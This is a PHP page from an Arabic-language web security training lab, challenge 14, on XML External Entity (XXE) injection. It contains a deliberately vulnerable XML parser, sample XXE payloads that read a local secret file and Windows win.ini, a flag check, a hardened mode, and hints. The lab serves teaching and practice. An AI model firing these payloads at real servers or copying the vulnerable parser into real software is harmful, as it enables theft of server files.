<?php
// ==============================================================================
// مشروع: مختبر الجوكر الفلسطيني لاختبار اختراق تطبيقات الويب (Joker Security Lab)
// التحدي 14: حقن الكيانات الخارجية XML (XML External Entity - XXE)
// إعداد وتطوير: المهندس احمد سليم 🇵🇸
// ==============================================================================

$page_title = "حقن الكيانات الخارجية (XXE) | مختبر الجوكر الفلسطيني";
require_once __DIR__ . '/../includes/header.php';

$sec = get_security_level();
$parsed_result = null;
$error_msg = "";
$success_msg = "";

$default_xml = '<?xml version="1.0" encoding="UTF-8"?>
<profile>
    <name>فادي الأحمد</name>
    <email>fadi@example.ps</email>
    <bio>مطور برمجيات وتطبيقات ويب سحابية</bio>
</profile>';

$xxe_payload_secret = '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE profile [
  <!ENTITY leak SYSTEM "file:///' . str_replace('\\', '/', realpath(__DIR__ . '/secret_note.txt')) . '">
]>
<profile>
    <name>مهاجم مختبر الجوكر</name>
    <email>hacker@joker-lab.ps</email>
    <bio>&leak;</bio>
</profile>';

$xxe_payload_win = '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE profile [
  <!ENTITY sysfile SYSTEM "file:///C:/Windows/win.ini">
]>
<profile>
    <name>System Auditor</name>
    <email>audit@localhost</email>
    <bio>&sysfile;</bio>
</profile>';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['xml_data'])) {
    $xml_input = trim($_POST['xml_data']);

    if (empty($xml_input)) {
        $error_msg = "يرجى إدخال كود XML صالح للمعالجة.";
    } else {
        if ($sec === 'low') {
            // كود مصاب: تفعيل استبدال الكيانات الخارجية عبر LIBXML_NOENT
            libxml_use_internal_errors(true);
            // LIBXML_NOENT يحل الكيانات العامة والكيانات الخارجية
            $xml = @simplexml_load_string($xml_input, 'SimpleXMLElement', LIBXML_NOENT);

            if ($xml === false) {
                $xml_errors = libxml_get_errors();
                libxml_clear_errors();
                $err_detail = !empty($xml_errors) ? $xml_errors[0]->message : "بنية XML غير صالحة.";
                $error_msg = "فشل تحليل مستند الـ XML: " . htmlspecialchars($err_detail);
            } else {
                $name = (string)($xml->name ?? '');
                $email = (string)($xml->email ?? '');
                $bio = (string)($xml->bio ?? '');

                $parsed_result = [
                    'name' => $name,
                    'email' => $email,
                    'bio' => $bio
                ];
                $success_msg = "تم تحليل مستند XML واستخراج حقول البيانات بنجاح!";

                // فحص نجاح استغلال ثغرة XXE واستخراج الملفات
                if (stripos($xml_input, '<!ENTITY') !== false && (
                    stripos($bio, 'FLAG') !== false || 
                    stripos($bio, 'الجوكر') !== false || 
                    stripos($bio, 'سرية') !== false || 
                    stripos($bio, 'secret') !== false || 
                    stripos($bio, 'extensions') !== false || 
                    stripos($bio, '16-bit') !== false ||
                    stripos($xml_input, 'secret_note.txt') !== false ||
                    stripos($xml_input, 'win.ini') !== false
                )) {
                    award_flag('xxe');
                }
            }
        } else {
            // كود آمن: حظر استخدام DTD والكيانات الخارجية تماماً مع استخدام LIBXML_NONET
            if (preg_match('/<!DOCTYPE|<!ENTITY/i', $xml_input)) {
                $error_msg = "⛔ [WAF & Secure Parser] تم حظر الطلب! تم اكتشاف تعريفات DTD وكيانات خارجية (XXE Attempt Blocked).";
            } else {
                libxml_use_internal_errors(true);
                // تفعيل خيار عدم الاتصال بالشبكة أو الكيانات
                $xml = @simplexml_load_string($xml_input, 'SimpleXMLElement', LIBXML_NONET);

                if ($xml === false) {
                    $xml_errors = libxml_get_errors();
                    libxml_clear_errors();
                    $error_msg = "خطأ في تحليل XML: بنية غير مطابقة للمواصفات الآمنة.";
                } else {
                    $parsed_result = [
                        'name' => htmlspecialchars((string)($xml->name ?? ''), ENT_QUOTES, 'UTF-8'),
                        'email' => htmlspecialchars((string)($xml->email ?? ''), ENT_QUOTES, 'UTF-8'),
                        'bio' => htmlspecialchars((string)($xml->bio ?? ''), ENT_QUOTES, 'UTF-8')
                    ];
                    $success_msg = "تمت معالجة البيانات بأمان عبر المحلل الآمن (Entity Loader Disabled).";
                }
            }
        }
    }
}
?>

<div class="d-flex justify-content-between align-items-center mb-4 pb-2 border-bottom border-secondary">
    <div>
        <h2 class="fw-bold text-white mb-1">
            <i class="fas fa-file-code text-warning me-2"></i> 14. حقن الكيانات الخارجية (XML External Entity - XXE)
        </h2>
        <p class="text-muted mb-0">
            تحدث ثغرة XXE عندما يقوم تطبيق الويب بتحليل مدخلات XML تحتوي على تعريف كيان خارجي (External Entity) يشير لملفات النظام أو موارد الشبكة دون تعطيل محلل الكيانات.
        </p>
    </div>
    <span class="badge bg-danger fs-6 px-3 py-2">
        <i class="fas fa-radiation me-1"></i> تسريب الملفات الحساسة و SSRF
    </span>
</div>

<!-- Architecture Flow Diagram Card -->
<div class="card card-cyber mb-4">
    <div class="card-cyber-header d-flex justify-content-between align-items-center">
        <h5 class="mb-0 text-info"><i class="fas fa-project-diagram me-2"></i> مخطط آلية تدفق هجوم XXE وتسرّب الملفات</h5>
        <span class="badge bg-dark border border-info text-info">XXE Attack Flow</span>
    </div>
    <div class="card-body p-4 text-center">
        <div class="row align-items-center g-3">
            <div class="col-md-3">
                <div class="p-3 rounded bg-black border border-warning text-center">
                    <i class="fas fa-laptop-code text-warning fs-1 mb-2"></i>
                    <h6 class="text-warning fw-bold mb-1">المهاجم (Attacker)</h6>
                    <small class="text-light text-opacity-75">يرسل ملف XML يحوي تعريف DTD خارجي <code>&lt;!ENTITY&gt;</code></small>
                </div>
            </div>
            <div class="col-md-1 d-flex justify-content-center">
                <i class="fas fa-arrow-left text-info fs-3 d-none d-md-block"></i>
                <i class="fas fa-arrow-down text-info fs-3 d-md-none"></i>
            </div>
            <div class="col-md-4">
                <div class="p-3 rounded bg-black border border-danger text-center">
                    <i class="fas fa-server text-danger fs-1 mb-2"></i>
                    <h6 class="text-danger fw-bold mb-1">محلل XML غير المحمي</h6>
                    <small class="text-light text-opacity-75">يقوم بتفسير <code>SYSTEM "file:///..."</code> وقراءة الملف السري من السيرفر</small>
                </div>
            </div>
            <div class="col-md-1 d-flex justify-content-center">
                <i class="fas fa-arrow-left text-success fs-3 d-none d-md-block"></i>
                <i class="fas fa-arrow-down text-success fs-3 d-md-none"></i>
            </div>
            <div class="col-md-3">
                <div class="p-3 rounded bg-black border border-success text-center">
                    <i class="fas fa-file-invoice text-success fs-1 mb-2"></i>
                    <h6 class="text-success fw-bold mb-1">تسرّب المحتوى</h6>
                    <small class="text-light text-opacity-75">يظهر محتوى الملف السري (Passwd / Notes) ضمن الاستجابة المعروضة!</small>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Interactive Challenge Card -->
<div class="card card-cyber mb-4">
    <div class="card-cyber-header d-flex justify-content-between align-items-center">
        <h4 class="mb-0 text-info"><i class="fas fa-user-edit me-2"></i> بوابة استيراد وتحديث الملف الشخصي (XML Profile Importer)</h4>
        <span class="badge bg-secondary">تحدي XXE</span>
    </div>
    <div class="card-body p-4">
        <p class="text-light">
            <strong>الهدف:</strong> قم باستغلال محلل XML في المستوى الضعيف لقراءة محتوى الملف السري <code>secret_note.txt</code> أو ملف النظام للحصول على علم التحدي (Flag).
        </p>

        <?= render_flag_box('xxe'); ?>

        <?php if (!empty($error_msg)): ?>
            <div class="alert alert-danger py-2 d-flex align-items-center mb-3">
                <i class="fas fa-exclamation-triangle me-2"></i>
                <div><?= $error_msg ?></div>
            </div>
        <?php endif; ?>

        <?php if (!empty($success_msg)): ?>
            <div class="alert alert-success py-2 d-flex align-items-center mb-3">
                <i class="fas fa-check-circle me-2"></i>
                <div><?= $success_msg ?></div>
            </div>
        <?php endif; ?>

        <div class="row">
            <div class="col-lg-7">
                <form method="POST" class="p-3 rounded bg-dark border border-secondary shadow-sm">
                    <div class="d-flex justify-content-between align-items-center mb-2">
                        <label class="form-label text-warning fw-bold mb-0">
                            <i class="fas fa-code me-1"></i> كود XML للملف الشخصي (XML Payload):
                        </label>
                        <div class="btn-group btn-group-sm">
                            <button type="button" class="btn btn-outline-info" onclick="loadSample('default')">نموذج عادي</button>
                            <button type="button" class="btn btn-outline-warning" onclick="loadSample('secret')">حمولة قراءة الملف السري</button>
                            <button type="button" class="btn btn-outline-danger" onclick="loadSample('win')">حمولة win.ini</button>
                        </div>
                    </div>

                    <textarea id="xml_data" name="xml_data" rows="11" class="form-control font-monospace bg-black text-light border-secondary mb-3" style="direction:ltr; text-align:left; font-size:0.88rem;"><?= htmlspecialchars($_POST['xml_data'] ?? $default_xml) ?></textarea>

                    <button type="submit" class="btn btn-warning text-dark fw-bold px-4">
                        <i class="fas fa-upload me-1"></i> معالجة واستيراد ملف XML
                    </button>
                </form>
            </div>

            <div class="col-lg-5 mt-4 mt-lg-0">
                <div class="card bg-dark border-secondary h-100">
                    <div class="card-header bg-black text-white d-flex justify-content-between align-items-center py-2">
                        <span class="small fw-bold"><i class="fas fa-id-card text-info me-1"></i> بيانات الملف الشخصي بعد التحليل:</span>
                        <span class="badge bg-secondary"><?= $sec === 'low' ? 'وضع Low' : 'وضع Secure' ?></span>
                    </div>
                    <div class="card-body p-3">
                        <?php if ($parsed_result): ?>
                            <div class="mb-3">
                                <label class="text-muted small d-block">الاسم المستخرج (Name):</label>
                                <div class="p-2 rounded bg-black border border-secondary text-white fw-bold">
                                    <?= htmlspecialchars($parsed_result['name']) ?>
                                </div>
                            </div>
                            <div class="mb-3">
                                <label class="text-muted small d-block">البريد الإلكتروني (Email):</label>
                                <div class="p-2 rounded bg-black border border-secondary text-info font-monospace">
                                    <?= htmlspecialchars($parsed_result['email']) ?>
                                </div>
                            </div>
                            <div class="mb-0">
                                <label class="text-muted small d-block">النبذة الشخصية (Bio / Leaked Data):</label>
                                <div class="p-2 rounded bg-black border <?= (stripos($parsed_result['bio'], 'FLAG') !== false || stripos($parsed_result['bio'], 'سرية') !== false) ? 'border-success text-success' : 'border-secondary text-warning' ?>" style="max-height: 200px; overflow-y: auto; font-family: monospace; direction:ltr; text-align:left; white-space: pre-wrap;">
                                    <?= htmlspecialchars($parsed_result['bio']) ?>
                                </div>
                            </div>
                        <?php else: ?>
                            <div class="text-center text-muted py-5">
                                <i class="fas fa-file-invoice text-secondary fs-1 mb-2"></i>
                                <p class="mb-0">أرسل مستند الـ XML لعرض البيانات المستخرجة هنا.</p>
                            </div>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<?= render_hints([
    "تعتمد لغة XML على تعريفات DTD (Document Type Definition) لتعريف بنية المستند والكيانات (Entities).",
    "باستخدام الكلمة المفتاحية <code>SYSTEM</code>، يمكن للكيان طلب ملف محلي مثل: <code>&lt;!ENTITY leak SYSTEM \"file:///path/to/file\"&gt;</code>.",
    "عند استدعاء الكيان في حقل النبذة الشخصية <code>&amp;leak;</code>، يقوم السيرفر الضعيف بقراءة الملف وإظهار محتواه!",
    "اضغط على زر <strong>(حمولة قراءة الملف السري)</strong> لتجربة استخراج العلم والملف الحساس بنقرة واحدة."
]); ?>

<?= render_code_comparison(
    '// ❌ كود مصاب: تفعيل استبدال الكيانات الخارجية\n$xml = simplexml_load_string($xml_input, "SimpleXMLElement", LIBXML_NOENT);\n// علم LIBXML_NOENT يجبر المحلل على حل الكيانات الخارجية واستبدالها!',
    '// ✅ كود محمي: حظر الكيانات الخارجية و DTD\nif (preg_match("/<!DOCTYPE|<!ENTITY/i", $xml_input)) {\n    die("XXE Attack Blocked!");\n}\n// استخدام LIBXML_NONET لتعطيل الوصول للشبكة\n$xml = simplexml_load_string($xml_input, "SimpleXMLElement", LIBXML_NONET);',
    'للحماية من هجمات XXE، يجب تعطيل معالجة الكيانات الخارجية (External Entities) تماماً وتجريد أو حظر تعريفات DOCTYPE في كافة أدوات تحليل XML مثل SimpleXML و DOMDocument و XMLReader.'
); ?>

<script>
function loadSample(type) {
    const editor = document.getElementById('xml_data');
    if (type === 'default') {
        editor.value = <?= json_encode($default_xml) ?>;
    } else if (type === 'secret') {
        editor.value = <?= json_encode($xxe_payload_secret) ?>;
    } else if (type === 'win') {
        editor.value = <?= json_encode($xxe_payload_win) ?>;
    }
}
</script>

<?php require_once __DIR__ . '/../includes/footer.php'; ?>
